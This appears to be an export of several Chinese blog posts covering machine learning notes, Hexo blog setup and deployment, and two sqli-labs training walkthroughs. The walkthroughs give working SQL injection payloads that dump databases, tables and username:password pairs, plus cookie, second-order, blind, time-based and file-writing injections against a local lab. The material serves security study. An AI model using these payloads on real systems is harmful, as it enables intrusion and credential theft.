在这个例子中，矩阵X为： $$ \\begin{align*}X = \\begin{bmatrix}1 &amp; 2014 &amp; 5 &amp; 1 &amp; 45 \\newline 1 &amp; 1416 &amp; 3 &amp; 2 &amp; 40 \\newline 1 &amp; 1534 &amp; 3 &amp; 2 &amp; 40 \\newline 1 &amp; 852 &amp; 2 &amp; 1 &amp;36 \\end{bmatrix} \\end{align*} $$ 向量y为： $$ \\begin{align*} y = \\begin{bmatrix} 460 \\newline 232 \\newline 315 \\newline 178 \\end{bmatrix} \\end{align*} $$ 这样通过正规方程就可以很容易地求出参数 θ（一定要注意，这里的参数 θ 是一个向量）。 既然求参数 θ 有两种方法，一个为梯度下降法，一个为正规方程，那么他俩之间一定会有优缺点，下表就是这两种方法的优缺点的对比： 梯度下降 正规方程 需要选择学习速率α 不需要选择学习速率 需要迭代 不需要迭代 时间复杂度O (kn2) O (n3), 需要计算XTX的逆矩阵 当特征值很多的时候，效率也很高 当特征值很多的时候，效率很低（要求逆矩阵） 既然要求逆矩阵，那么就肯定会出现XTX不可逆的时候。 第一种情况： 出现了两个相似的特征，这个两个特征可以用一个线性关系进行表示。例如，米和英尺，这两个都是用来描述长度的单位，且他们之间可以进行相互转化，如果特征值同时出现他们两个，就会出现矩阵不可逆的情况。 解决方法：去掉任意一个即可。 第二种情况：特征值的数量特别多，但是数据集的数量特别少。 解决方法：增加数据集或减少特征值。","tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://ca0y1h.top/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"线性回归","slug":"线性回归","permalink":"http://ca0y1h.top/tags/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/"}],"categories":[{"name":"机器学习","slug":"机器学习","permalink":"http://ca0y1h.top/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"基础入门","slug":"机器学习/基础入门","permalink":"http://ca0y1h.top/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"}]},{"title":"Hexo渲染LaTeX数学公式","date":"2019-10-26T06:01:20.000Z","path":"Other/3.Hexo渲染LaTeX数学公式/","text":"Hexo渲染LaTeX数学公式 最近在跟着吴恩达教授在Coursera网站上的课程学习机器学习，其中涉及到的公式比多，包括线性代数和微分。这里基于 Hexo 介绍如何在博客上进行 LaTeX 公式的编写和渲染。 在 Hexo 中配置 MathJax 环境配置 Hexo 中对网页进行渲染的 marked 并不支持 mathjax，我们用 Git Bash 进入博客工程所在的文件夹下并执行以下命令： 1npm uninstall hexo-renderer-marked --savenpm install hexo-renderer-kramed --save 停止 hexo-math 卸载可能安装的 hexo-math 1npm uninstall hexo-math --save 再安装 hexo-renderer-mathjax 包 1npm install hexo-rederer-mathjax 更新 mathjax 的 CDN 连接 按照 node_modules →→ hexo-renderer-mathjax 的顺序进入目录，对 mathjax.html 文档进行修改，把 `` 改为 1&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;mathjax&#x2F;2.7.1&#x2F;MathJax.js?config&#x3D;TeX-MML-AM_CHTML&quot;&gt;&lt;&#x2F;script&gt; 更改默认的转义规则 因为 Hexo 在处理特殊字符时会对某些字符转为 html 中的网页标签，我们按照 node_modules →→ kramed →→ lib →→ rules 的顺序进入目录并修改 inline.js ，将其中的两行 1escape: &#x2F;^\\\\([\\\\&#96;*&#123;&#125;\\[\\]()#$+\\-.!_&gt;])&#x2F;,em: &#x2F;^\\b_((?:__|[\\s\\S])+?)_\\b|^\\*((?:\\*\\*|[\\s\\S])+?)\\*(?!\\*)&#x2F;, 对应修改为 1escape: &#x2F;^\\\\([&#96;*\\[\\]()#$+\\-.!_&gt;])&#x2F;,em: &#x2F;^\\*((?:\\*\\*|[\\s\\S])+?)\\*(?!\\*)&#x2F;, 开启 mathjax 进入工程目录的主题文件夹下，找到 _config.yml 文件并开启 mathjax： 12mathjax: enable: true 在我们每一次使用 Git Bash 创建博客文章后，Hexo 都会自动为我们生成头部信息，我们在需要插入 LaTeX 公式的博客的头部加上 1mathjax: true 这样我们就可以在博客中编写数学公式了。","tags":[{"name":"hexo","slug":"hexo","permalink":"http://ca0y1h.top/tags/hexo/"}],"categories":[{"name":"技术随笔","slug":"技术随笔","permalink":"http://ca0y1h.top/categories/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/"}]},{"title":"Web安全学习之Sqli-labs手工注入——Advanced-Injections","date":"2019-10-25T10:27:48.000Z","path":"Web_security/basic_learning/8.Sqli-labs手工注入——Advanced-Injections/","text":"Web安全学习之Sqli-labs手工注入——Advanced-Injections Sqli-labs手工注入第二阶段，主要都是一些绕过的技巧（包括WAF）。 Less-21 Cookie injection-base64 encoded-single quotes and parenthesis 登录成功后的页面： 很明显cookie字段是被加密处理了（而且后面的=暴露了应该是base64编码方式）。 插播一个关于讲解base64编码方式的博文，点击跳转。 查看php文件确实如此，所以只需要上传paylaod的时候base64加密一下就可以了。 %3d应该是=号urldecode的结果 接下来构造payload进行测试： 12admin&#39; and 1&#x3D;1 --+ &#x2F;&#x2F;明文YWRtaW4nIGFuZCAxPTEgLS0r &#x2F;&#x2F;密文 根据SQL错误信息的提示，应该是少了一个)： 12admin&#39;) and 1&#x3D;1# &#x2F;&#x2F;明文YWRtaW4nKSBhbmQgMT0xIw&#x3D;&#x3D; &#x2F;&#x2F;密文 示例爆库paylaod： 12-admin&#39;) union select 1,2,database()#LWFkbWluJykgdW5pb24gc2VsZWN0IDEsMixkYXRhYmFzZSgpIw&#x3D;&#x3D; Less-22 Cookie injection-base64 encoded-double quotes 和less-21一样的，只需要使用双引号代替单引号再取掉括号即可。 样例payload 12-admin&quot; union select 1,2,database()#LWFkbWluIiB1bmlvbiBzZWxlY3QgMSwyLGRhdGFiYXNlKCkj Less-23 GET-Error bases-strip comments 多次输入发现这道题不能用注释符来注掉后面Limit语句，只能转而用单引号闭合的方式。 尝试： 1?id&#x3D;1 and &#39; 发现SQL语句不报错，那么久可以使用联合查询： 1?id&#x3D;-1&#39; union select 1,database(),3 and &#39; 爆表payload： 1?id&#x3D;-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; or &#39;1&#39;&#x3D;&#39; Less-24 POST-Second Oder Injections *Real Treate* Stored Injections 首先注册一个新用户，用户名必须是admin'#： 然后登录admin'#账号，并修改该账号的密码，但此时修改的就是admin的密码： 这是因为：SQL语句变为 1UPDATE users SET passwd&#x3D;&quot;New_Pass&quot; WHERE username &#x3D;&#39;admin&#39; # &#39; AND password&#x3D;&#39; 也就是执行了 1UPDATE users SET passwd&#x3D;&quot;New_Pass&quot; WHERE username &#x3D;&#39;admin&#39; 再可以去后台的数据库查看users表的记录： 发现账号admin的密码被更改了！！！ 二次注入成功。 Less-25 Get-Error based-All you OR &amp; AND belong to us - string single quote 根据页面的提示，很明显程序把我们输入的and和or关键字过滤掉了。 解决方法就是双写and或or关键字，例如：","tags":[{"name":"sql注入","slug":"sql注入","permalink":"http://ca0y1h.top/tags/sql%E6%B3%A8%E5%85%A5/"}],"categories":[{"name":"web安全","slug":"web安全","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"基础学习","slug":"web安全/基础学习","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"Machine_Learning-Week1","date":"2019-10-25T05:15:45.000Z","path":"Machine_learning/basic_learning/1.Machine-Learning-Week1/","text":"Machine_Learning-Week1 机器学习介绍 什么是机器学习？视频中给出了两种定义，从具体理解来看，我更倾向于Tom Mitchell的定义，原文是： A computer program is said to learn from experience E with respect to some class of tasks T and performance measure P, if its performance at tasks in T, as measured by P, improves with experience E. 用DeepMind下围棋来解释就是： E：下很多场围棋的体验 T：某一局下棋的任务 P：DeepMind赢得比赛的可能性 总体来说，机器学习可以分为两大类：监督学习（supervised learning）和无监督学习（unsupervised learning）。 监督学习 在监督学习中，我们事先就有了一个数据集，并且已经知道正确的输出应该是什么样子，并认为输入和输出之间存在某种联系。 监督学习问题分为“回归（regression）”和“分类（classification）”问题。 在回归问题中，我们试图预测连续输出中的结果，这意味着我们试图将输入变量映射到某个连续函数。 在分类问题中，我们改为尝试预测离散输出中的结果。 换句话说，我们正在尝试将输入变量映射为离散类别。 举例来说： 给定数据，预测房屋的具体价格。判断是回归问题还是分类问题，价格作为规模的函数是一个连续的输出，因此这是一个回归问题。但是，如果我们把输出改变一下，我们可以通过输出关于房屋是否“以高于或低于要价的价格出售”的输出，从而将这个示例转变为分类问题。 在这里，我们根据价格将房屋分为两个离散类别。 所以我们判断一个机器学习的问题是分类问题还是回归问题，我们看的是它的输出类型，如果是离散数据那么就是一个分类问题，如果是连续数据，那么就是回归问题。 无监督学习 我们有一些问题，但是不知道答案，我们要做的无监督学习就是按照他们的性质把他们自动地分成很多组，每组的问题是具有类似性质的（比如数学问题会聚集在一组，英语问题会聚集在一组，物理…）。 所有数据只有特征向量没有标签，但是可以发现这些数据呈现出聚群的结构，本质是一个相似的类型的会聚集在一起。把这些没有标签的数据分成一个一个组合，就是聚类（Clustering）。比如Google新闻，每天会搜集大量的新闻，然后把它们全部聚类，就会自动分成几十个不同的组（比如娱乐，科技，政治…），每个组内新闻都具有相似的内容结构。 无监督学习还有一个典型的例子就是鸡尾酒会问题（声音的分离），在这个酒会上有两种声音，被两个不同的麦克风在不同的地方接收到，而可以利用无监督学习来分离这两种不同的声音。注意到这里是无监督学习的原因是，事先并不知道这些声音中有哪些种类（这里的种类就是标签的意思）。 单变量线性回归 什么是线性回归模型？回想一下在回归问题中，我们正在使用输入变量，并试图将输出拟合到连续的预期结果函数中。 那么，具有一个变量的线性回归称为“单变量线性回归”，即根据单个输入值x预测单个输出值y时，使用单变量线性回归。 假设函数（Hypothesis Function） $$ \\hat{y} = h_\\theta(x) = \\theta_0 + \\theta_1 x $$ 线性回归模型的假设函数就是一个一元一次多项式，从几何角度来讲，这个函数在坐标轴上反映为一条直线，x是自变量，y是因变量。 举例来说： input x output y 0 4 1 7 2 7 3 8 根据表格中给定的输入和输出，我们可以猜测假设函数为：hθ(x)=2+2x 但是我们x输入1的话，y输出是4，这与实际给定值偏差了3，所以我们需要寻找一组最合适的θ1和θ2来最佳拟合给定的数据。 代价函数（Cost Function） 我们使用代价函数来衡量上面给定的假设函数的精确性，这将假设的所有结果取平均值（实际上是平均值的简化版本），其中将x的输入与实际输出y的输入进行比较。 $$ J(\\theta_0, \\theta_1) = \\dfrac {1}{2m} \\displaystyle \\sum {i=1}^m \\left ( \\hat{y}{i}- y_{i} \\right)^2 = \\dfrac {1}{2m} \\displaystyle \\sum {i=1}^m \\left (h\\theta (x_{i}) - y_{i} \\right)^2 $$ 用符号J来表示代价函数，把这个函数拆开来看一下： $$ \\sum {i=1}^m \\left (h\\theta (x_{i}) - y_{i} \\right)^2 $$ i 为第 i 个数据，上式表示我通过拟合函数 hθ(x) 得到的第 i 个数据与真实的第 i 个数据的误差。总共有 m 个数据，那么我们就应该把 m 个数据的误差求和然后再求出平均误差，得到下面这个式子。 $$ \\dfrac {1}{2m} \\displaystyle \\sum {i=1}^m \\left (h\\theta (x_{i}) - y_{i} \\right)^2 $$ 其实除以 m 或 2m 代价函数最优化的结果都是相同的，这里为了后续求导计算方便，因此用 2m处理。 只要我让这个值尽可能的小，那么我们所做的拟合函数就越准确，所以刚才求拟合函数的问题就转化成了通过 θ0 和 θ1 求 J(θ0, θ1) 的最小值，及最优化问题。 讲到这里，有必要对上面的知识点进行一些小的总结： 首先给了一个假设函数： Hypothesis： $$ \\hat{y} = h_\\theta(x) = \\theta_0 + \\theta_1 x $$ 代价函数中的θ0和θ1是任意的，那么我们就需要一个函数来判断这个假设函数与真实数据之间的拟合度如何，为了描述拟合度，我们又提出了代价函数： $$ J(\\theta_0, \\theta_1) = \\dfrac {1}{2m} \\displaystyle \\sum {i=1}^m \\left ( \\hat{y}{i}- y_{i} \\right)^2 = \\dfrac {1}{2m} \\displaystyle \\sum {i=1}^m \\left (h\\theta (x_{i}) - y_{i} \\right)^2 $$ 我们的目标当然是代价函数的值越小越好，即用数学公式表示为： $$ \\min_{\\theta_1,\\theta_2} J(\\theta_1,\\theta_2) $$ 为了说明代价函数是如何进行工作的，现在我们来简化一下问题，让 θ0=0，这样我们要求的拟合函数就是一条过原点的直线，参数就剩下一个 θ1，θ1 代表直线的斜率。如下图所示，我想要拟合左图中的 3 个点，我就要取不同的参数 θ1 进行尝试，θ1 取值不同，直线的颜色不同。这里 θ1 分别取 0, 0.5, 1，直线的颜色分别为深蓝、紫色和浅蓝色。如何确定哪条直线拟合的最好呢，我们就要把 θ1 的不同取值带入到代价函数 J(θ1) 中（右图）。这里我们就发现，当 θ1=1 时，代价函数值最小为 0，那么我们就找到了拟合函数 hθ(x)= θ1x 的最佳参数 θ1=1。 如果有两个参数 θ0 和 θ1，那么他们的代价函数图像就是一个三维图像。 用轮廓图画出来的话就是这样（轮廓图类似于等高线图） 右边的轮廓图一圈就相当于左边的同一条直线。 我们可以发现，越往轮廓图的中心位置移动，假设函数与真实数据就更加拟合。 如果是每次要我们人工去寻找这个最低点，未免也太不“人工智能”了。 有没有一种算法可以自动地求出使得代价函数最小的点呢？有，那就是梯度下降。 （又到了最优化的问题了） 梯度下降（Gradient Descent） **梯度下降（Gradient descent）**是一个用来求代价函数最小值的算法。梯度下降算法的思想就是首先先从一组参数值（θ0, θ1）开始，不断地去尝试各种（θ0, θ1），直到使得代价函数 J(θ0, θ1) 最小为止。以下图代价函数为例，从不同起始点开始，到达的局部最优位置不同，也就是局部最优解不同。 梯度下降算法用以下伪代码表示： repeat until convergence: $$ \\theta_j := \\theta_j - \\alpha \\frac{\\partial}{\\partial \\theta_j} J(\\theta_0, \\theta_1) $$ 具体应用到线性回归算法当中，算法表现为：（也就是把代价函数代入上式中） 在每一次迭代的过程中，必须同时更新θ0和θ1的值，即： 再稍微解释一下这个算法： 首先是一个循环结构，当不能再更新θ0, θ1时循环停止，:=是一个赋值号，α是学习速率，也就是下山每次迈出多大步子，后面紧跟着的是一个偏导数。 用几何图形来解释显得更为直观，不妨设θ0=0： 其中 α 后面的导数就代表着这一点的斜率，每次 θ1 更新都是减去一个 α与该点的斜率之积，当下降到局部最小处时，导数恰好为零，此时 θ1 不再更新，就得到了我们想要的结果 ，如下图所示： 对于α的取值还是比较讲究的，如果α太大， 会出现下图中的情况，直接跳过局部最优解，一直循环，而且离局部最优解会越来越远。如果α太小，寻找局部最优解的速率会特别特别慢。 线性回归的梯度下降算法 到现在，我们已经学过了线性回归模型、代价函数和梯度下降，这三个算法就可以组成我们今天要学到的第一个机器学习算法：线性回归的梯度下降算法 （Gradient Descent For Linear Regression） 左边是梯度下降算法，右边是线性回归模型和代价函数。 分别求出 j=0 和 j=1 时代价函数的偏导数： $$ \\frac{\\partial}{\\partial \\theta_0} J(\\theta_0, \\theta_1)=\\dfrac {1}{m} \\displaystyle \\sum {i=1}^m \\left (h\\theta (x^{(i)}) - y^{(i)} \\right) $$ 和 $$ \\frac{\\partial}{\\partial \\theta_1} J(\\theta_0, \\theta_1)=\\dfrac {1}{m} \\displaystyle \\sum {i=1}^m \\left ((h\\theta (x^{(i)}) - y^{(i)} \\right)x^{(i)} $$ 那么，把一般性的梯度下降算法应用到线性回归模型的时候，就可以得出一个新的具体形式： $$ \\begin{align*} \\text{repeat until convergence: } \\lbrace &amp; \\newline \\theta_0 := &amp; \\theta_0 - \\alpha \\frac{1}{m} \\sum\\limits_{i=1}^{m}(h_\\theta(x_{i}) - y_{i}) \\newline \\theta_1 := &amp; \\theta_1 - \\alpha \\frac{1}{m} \\sum\\limits_{i=1}^{m}\\left((h_\\theta(x_{i}) - y_{i}) x_{i}\\right) \\newline \\rbrace&amp; \\end{align*} $$ 这个算法也叫做批量梯度下降（Batch Gradient Descent ），他的特点就是每次进行梯度下降都要使用整个数据集。","tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://ca0y1h.top/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"线性回归","slug":"线性回归","permalink":"http://ca0y1h.top/tags/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/"}],"categories":[{"name":"机器学习","slug":"机器学习","permalink":"http://ca0y1h.top/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"基础入门","slug":"机器学习/基础入门","permalink":"http://ca0y1h.top/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"}]},{"title":"阿里云Centos7+Ngnix部署Hexo","date":"2019-10-24T05:08:47.000Z","path":"Other/1.阿里云Centos7-Ngnix部署Hexo/","text":"阿里云Centos7+Ngnix部署Hexo 之前一直把hexo部署在GitHub Page上，缺点就是访问的速度慢，有时候甚至加载不出来，刚好之前买的阿里云ECS也落灰了，顺手把hexo部署在阿里云上，再顺手记录一下部署过程。 部署环境 本地环境： Window10（64bit） Git NodeJS Hexo 云主机环境 Centos7 Nginx 其他 宝塔面板 开始部署 生成ssh公钥 如果本机已有id_rsa.pub文件，此步骤可跳过 在Win10桌面右击，点击Git Bash Here打开命令行终端，执行如下命令（直接按三次回车生成密钥） 1ssh-keygen -t rsa 生成的文件默认在C:/用户/本机用户名/.ssh/路径下。 Centos搭建环境 安装Git 1yum -y install git 创建Git账户 1adduser git 添加账户权限 12chmod 740 /etc/sudoersvim /etc/sudoers 找到下面这一行： 12## Allow root to run any commands anywhereroot ALL=(ALL) ALL 紧接着添加： 1git ALL(ALL) ALL 设置Git账户密码 1sudo passwd git 复制公钥 切换至git用户，创建./ssh文件夹和``~/.ssh/authorized_keys `文件，并给权限： 123456su gitmkdir ~/.sshvim ~/.ssh/authorized_keys# 然后将win10中生成的id_rsa.pub文件中的公钥复制到authorized_keyschmod 600 /home/git/.ssh/authorzied_keyschmod 700 /home/git/.ssh 在本地Git终端中测试是否能免密登录git，其中SERVER为填写自己的云主机IP，执行输入yes后不用密码就说明好了 1ssh -v git@SERVER 创建本地仓库和网站根目录 首先创建目录并给权限： 12345678#repo作为为Git仓库目录mkdir /var/repochown -R git:git /var/repochmod -R 755 /var/repo#hexo作为网站根目录mkdir /var/www/hexochown -R git:git /var/www/hexochmod -R 755 /var/www/hexo 然后创建一个Git仓库： 12cd var/repogit init --bare hexoBlog.git 自动部署 在 /var/repo/hexoBlog.git下，有一个自动生成的hooks文件夹。我们需要在里边新建一个新的钩子文件post-receive。 1vim /var/repo/hexoBlog.git/hooks/post-receive 添加一下内容： 12#!/bin/bashgit --work-tree=/var/www/hexo --git-dir=/var/repo/hexoBlog.git checkout -f 修改文件权限，使得其可执行： 12chown -R git:git /var/repo/hexoBlog.git/hooks/post-receivechmod +x /var/repo/hexoBlog.git/hooks/post-receive Centos配置Nginx 为了适合小白安装部署和后期网站服务器的扩展性，选用宝塔面板来一键部署Nginx。宝塔面板的安装和使用可以查看官方文档。 Nginx部署成功后就可以创建网站了。 没有域名的可以填写IP地址。 注意：根目录的路径必须是你上一步在云服务器上创建的网站目录。 本地Hexo配置 配置_config.yml,完成自动化部署。 打开blog文件夹，编辑_config.yml，找到deploy： 123456deploy: type: git #server改为你的服务IP地址或解析后的域名 #例如我改为repo: git@ali6.cn:/var/repo/blog.git repo: git@server:/var/repo/hexoBlog.git branch: master 再执行命令： 12hexo cleanhexo g -d 不出错显绿说明完成，打开浏览器输入你的域名或ip地址就可以看到你部署的Hexo博客了。","tags":[{"name":"hexo","slug":"hexo","permalink":"http://ca0y1h.top/tags/hexo/"}],"categories":[{"name":"技术随笔","slug":"技术随笔","permalink":"http://ca0y1h.top/categories/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/"}]},{"title":"Web安全学习之sqli-labs手工注入——Basic-Challenge","date":"2019-10-20T07:06:02.000Z","path":"Web_security/basic_learning/9.Sqli-labs手工注入——Basic-Challenge/","text":"Web安全学习之sqli-labs手工注入——Basic-Challenge SQL注入中的大名鼎鼎的sqli-labs闯关，根据网上现有的教程再加上自己的实践，记录一下闯关过程。这一篇是Basic-Challenge阶段的题目。 Less-1 基于错误的GET单引号字符型注入 判断注入类型 1http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-1&#x2F;?id&#x3D;1&#39; &#x2F;&#x2F;报错 相当于执行SQL语句： 1select * from users where id &#x3D; &#39;1&#39;&#39;; 那是因为我们之前的语句闭合了前面的'，而后面单一个'，所以会报错 1http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-1&#x2F;?id&#x3D;1&#39; or &#39;1&#39;&#x3D;&#39;1 &#x2F;&#x2F;正常 相当于执行SQL语句： 1select * from users where id &#x3D; &#39;1&#39; or &#39;1&#39;&#x3D;&#39;1&#39;; 判断列数 12http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-1&#x2F;?id&#x3D;1%27%20order%20by%203%20--+ &#x2F;&#x2F;正常http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-1&#x2F;?id&#x3D;1%27%20order%20by%204%20--+ &#x2F;&#x2F;报错 可以看出总共有三列，结合union查询。 爆库payload 1http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-1&#x2F;?id&#x3D;-1%27%20union%20select%201,2,database()%20--+ 注意这里必须取一个id不存在的数字，例如-1 相当于执行SQL语句： 1select * from users where id &#x3D; &#39;-1&#39; union select 1,2,database() -- &#39;limit 1,2; 爆表payload 1http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-1&#x2F;?id&#x3D;-1%27%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema&#x3D;database()%20--+ 相当于执行SQL语句： 1select * from users where id &#x3D; &#39;-1&#39; union select 1,2,group_concat(table_name) from information_schema.table where table_schema&#x3D;database() -- limit 1,2; group_concat()函数把来自多行的数据连接到一个字段当中。 爆字段名payload 1http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-1&#x2F;?id&#x3D;-1%27%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name&#x3D;%27users%27%20--+ 相当于执行SQL语句： 1select * from users where id &#x3D; &#39;-1&#39; union select 1,2,group_concat(column_name) from information_schema.column where table_name&#x3D;&#39;users&#39; -- limit 1,2; 爆值payload 1http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-1&#x2F;?id&#x3D;0%27%20union%20select%201,2,group_concat(username,0x3a,password)%20from%20users--+ 相当于SQL语句： 1select * from users where id&#x3D; &#39;0&#39; union select 1,2,group_concat(user, 0x3a, password) from users -- &#39;limit 1,2; 0x3a： 0x是十六进制标志，3a是十进制的58，是ascii中的 ‘:’ ，用以分割pasword和username。 Less-2 基于错误的GET单引号字符型注入 判断注入类型 1http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-2&#x2F;?id&#x3D;1%27%20and%201&#x3D;1%20--+ 报错 1http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-2&#x2F;?id&#x3D;1%27%20and%201&#x3D;1%20--+ 不报错 说明这里接收的id参数类型为 int 型，也就是没有 ' 去闭合。 其他步骤与Less1类似，在此不再赘述。 Less-3 基于错误的GET单引号变形字符型注入 判断注入类型 1http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-3&#x2F;?id&#x3D;1%27 报错信息如下： 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1 有一个括号，所以尝试闭合一下括号： 1http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-3&#x2F;?id&#x3D;1)%20and%201&#x3D;1%20--+ 正确显示信息。 其他步骤与Less1类似，在此不再赘述。 Less-4 基于错误的GET双引号字符型注入 判断注入类型 先使用单引号闭合： 1http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-3&#x2F;?id&#x3D;1%27 报错信息如下： 1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1 尝试使用&quot;&quot;)闭合： 1http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-4&#x2F;?id&#x3D;1%22)%20--+ 其他步骤与Less1类似，在此不再赘述。 Less-5 双注入GET单引号字符型注入 关于双注入的形成和理解，我单独写了另外一篇博文，可以移步至此。 爆库payload： 1http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-5&#x2F;?id&#x3D;-1&#39; union select 1,count(*), concat((select database()), floor(rand()*2))as a from information_schema.tables group by a --+ 注意，由于有随机性，可能成功执行了语句所以不会报错，正常的显示页面（即不报错）。 爆列名payload: 1http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-5&#x2F;??id&#x3D;-1&#39; union select count(*),1, concat((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 1,1),floor(rand()*2)) as a from information_schema.tables group by a--+ 爆字段payload： 1http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-5&#x2F;?id&#x3D;-1&#39; union select 1,count(*), concat((select concat_ws(&#39;|&#39;,username,password) from users limit 1,1), floor(rand()*2))as a from information_schema.tables group by a --+ 修改limit x,1 可以显示第x个用户的password和username。 Less-6 双注入GET双引号字符型注入 双引号字符型注入，上一题的单引号改成双引号就可以了。 Less-7 导出文件GET字符型注入 详细题解 这道题最开始使用单引号闭合发现会有语法错误，只能经过不断大量的尝试，最后才能确定以下查询语句： 1http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-7&#x2F;?id&#x3D;1&#39;)) --+ 确定语法正确后，可以开始编写payload： 1http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-7&#x2F;?id&#x3D;1&#39;)) union select 1,2,3 into outfile &quot;&#x2F;tmp&#x2F;hack1.txt&quot; --+ 爆库payload 1http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-7&#x2F;?id&#x3D;1&#39;)) union select 1,2,database() into outfile &quot;&#x2F;tmp&#x2F;hack1.txt&quot; --+ 爆表payload 1http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-7&#x2F;?id&#x3D;1&#39;)) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema &#x3D; database() into outfile &quot;&#x2F;tmp&#x2F;hack2.txt&quot; --+ 爆字段名payload 1http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-7&#x2F;?id&#x3D;1&#39;)) union select 1,2,group_concat(column_name) from information_schema.columns where table_name &#x3D; &#39;users&#39; into outfile &quot;&#x2F;tmp&#x2F;hack3.txt&quot; --+ Less-8 布尔型单引号GET盲注 判断注入类型 首先尝试?id=1，发现可以正常回显。再使用嵌入单引号?id=1'，发现不能正常回显，也没有任何错误消息。只好通过盲注来验证，该注入查询返回的一定是True或False。 1http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and 1&#x3D;1 --+ 对应MySQL语句是： 1SELECT * from table_name WHERE id&#x3D;1&#39; AND 1&#x3D;1 由回显的结果可知该查询是有效的。 接着下一条查询： 1http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and 1&#x3D;0 --+ 对应的MySQL语句是： 1SELECT * from table_name WHERE id&#x3D;&#39;1&#39; AND 1&#x3D;0 同样的，数据库会对给定的情况1=0进行检查，显然该查询无效的，因此将会返回FALSE。 以上即可说明该数据库是可被盲注的。 数据库名的长度payload 1http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and length(database())&#x3D;8 --+ 数据库名的值payload 1http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and (ascii(substr(database(),1,1)))&#x3D;115 --+ 其余依次类推，只需要改变substr函数的第二个参数即可。 表名的长度payload 1http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and (length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1)))&#x3D;5 --+ 表名的值payload 1http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and (ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1), 1, 1)))&#x3D;117 --+ 其余依次类推，只需要改变substr函数的第二个参数即可。 字段名的长度payload 1http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and (length((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 1,1)))&#x3D;8 --+ 字段的值payload 1http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and (ascii(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 1,1),1,1)))&#x3D;117 --+ 其余依次类推，只需要改变substr函数的第二个参数即可。 Less-9 基于时间的GET单引号盲注 基于时间的盲注和基于布尔类型的盲注原理上差异不大，只是在判断是否正确时，前者是看是否有明显的延迟，后者是看是否有回显。 判断注入类型 不管怎么输入，回显总是you are …，考虑时间型盲注： 1http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and sleep(3) --+ 发现明显延迟，说明注入成功。 数据库名的长度payload 1http:&#x2F;&#x2F;0.0.0.0:8080&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(length(database())&#x3D;8, sleep(3), 1) --+ 